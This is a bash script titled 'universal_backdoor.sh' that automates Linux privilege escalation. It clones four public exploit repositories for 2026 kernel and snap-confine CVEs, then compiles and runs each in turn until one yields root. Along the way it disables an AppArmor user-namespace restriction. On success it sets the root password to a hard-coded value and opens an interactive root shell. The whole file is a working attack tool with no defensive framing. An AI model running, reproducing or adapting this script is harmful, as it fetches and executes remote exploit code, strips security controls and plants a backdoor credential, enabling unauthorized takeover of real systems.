#!/bin/bash
# universal_backdoor.sh - Minimal output version

set -euo pipefail

WORK_DIR="/tmp/.x_$$"
NEW_PASSWORD="noddened"
SUCCESS=0

# Repositories
COPYFAIL_REPO="https://github.com/tgies/copy-fail-c.git"
FRAGNESIA_REPO="https://github.com/0xBlackash/CVE-2026-46300.git"
DIRTYFRAG_REPO="https://github.com/V4bel/dirtyfrag.git"
SNAPD_REPO="https://github.com/nomaisthere/CVE-2026-3888.git"

cleanup() {
    cd /
    rm -rf "$WORK_DIR" 2>/dev/null
}
trap cleanup EXIT INT TERM

# Already root?
if [ "$EUID" -eq 0 ]; then
    echo "[+] Already root"
    echo "root:${NEW_PASSWORD}" | chpasswd 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "[+] Password changed to: ${NEW_PASSWORD}"
    else
        echo "[-] Password change failed"
    fi
    /bin/bash -i
    exit 0
fi

mkdir -p "$WORK_DIR"
cd "$WORK_DIR"

# ==================== DIRTY FRAG (CVE-2026-43500) ====================
run_dirtyfrag() {
    if ! command -v git &>/dev/null || ! command -v gcc &>/dev/null; then
        return 1
    fi
    
    # Check rxrpc module (loaded by default on Ubuntu)
    local kernel=$(uname -r)
    if ! lsmod 2>/dev/null | grep -q rxrpc && \
       ! grep -q rxrpc "/lib/modules/$kernel/modules.builtin" 2>/dev/null; then
        return 1
    fi
    
    git clone --depth 1 "$DIRTYFRAG_REPO" dirtyfrag 2>/dev/null
    cd dirtyfrag
    gcc -O0 -Wall -o exp exp.c -lutil 2>/dev/null
    [ -f exp ] && ./exp 2>/dev/null
    [ "$EUID" -eq 0 ]
}

# ==================== COPY FAIL (CVE-2026-31431) ====================
run_copyfail() {
    if ! command -v git &>/dev/null || ! command -v gcc &>/dev/null; then
        return 1
    fi
    
    local kernel=$(uname -r)
    if ! lsmod 2>/dev/null | grep -q algif_aead && \
       ! grep -q algif_aead "/lib/modules/$kernel/modules.builtin" 2>/dev/null; then
        return 1
    fi
    
    git clone --depth 1 "$COPYFAIL_REPO" copyfail 2>/dev/null
    cd copyfail
    gcc -o exploit exploit.c utils.c -Wall 2>/dev/null
    [ -f exploit ] && ./exploit 2>/dev/null
    [ "$EUID" -eq 0 ]
}

# ==================== FRAGNESIA (CVE-2026-46300) ====================
run_fragnesia() {
    if ! command -v git &>/dev/null; then
        return 1
    fi
    
    # Disable AppArmor restriction
    [ -f /proc/sys/kernel/apparmor_restrict_unprivileged_userns ] && \
        echo 0 > /proc/sys/kernel/apparmor_restrict_unprivileged_userns 2>/dev/null
    
    git clone --depth 1 "$FRAGNESIA_REPO" fragnesia 2>/dev/null
    cd fragnesia
    
    if command -v python3 &>/dev/null && [ -f CVE-2026-46300.py ]; then
        chmod +x CVE-2026-46300.py
        timeout 30 python3 CVE-2026-46300.py 2>/dev/null
    elif [ -f CVE-2026-46300.sh ]; then
        chmod +x CVE-2026-46300.sh
        timeout 30 bash CVE-2026-46300.sh 2>/dev/null
    fi
    
    [ "$EUID" -eq 0 ]
}

# ==================== SNAP-CONFINE (CVE-2026-3888) ====================
run_snapd() {
    if ! command -v git &>/dev/null || ! command -v gcc &>/dev/null; then
        return 1
    fi
    
    if ! command -v snap &>/dev/null; then
        return 1
    fi
    
    git clone --depth 1 "$SNAPD_REPO" snapd_exp 2>/dev/null
    cd snapd_exp/src
    gcc -o firefox_2404 firefox_2404.c 2>/dev/null
    gcc -o librootshell.so -shared -fPIC librootshell.c 2>/dev/null
    [ -f firefox_2404 ] && timeout 60 ./firefox_2404 2>/dev/null
    [ "$EUID" -eq 0 ]
}

# ==================== MAIN ====================
# Try exploits in order
if run_dirtyfrag; then
    echo "[+] CVE-2026-43500 (Dirty Frag) succeeded"
    SUCCESS=1
elif run_copyfail; then
    echo "[+] CVE-2026-31431 (Copy Fail) succeeded"
    SUCCESS=1
elif run_fragnesia; then
    echo "[+] CVE-2026-46300 (Fragnesia) succeeded"
    SUCCESS=1
elif run_snapd; then
    echo "[+] CVE-2026-3888 (snap-confine) succeeded"
    SUCCESS=1
fi

# Post-root actions
if [ $SUCCESS -eq 1 ]; then
    echo "root:${NEW_PASSWORD}" | chpasswd 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "[+] Password changed to: ${NEW_PASSWORD}"
    else
        echo "[-] Password change failed"
    fi
    echo "[+] Spawning root shell..."
    /bin/bash -i
    exit 0
fi

echo "[-] All exploits failed"
exit 1
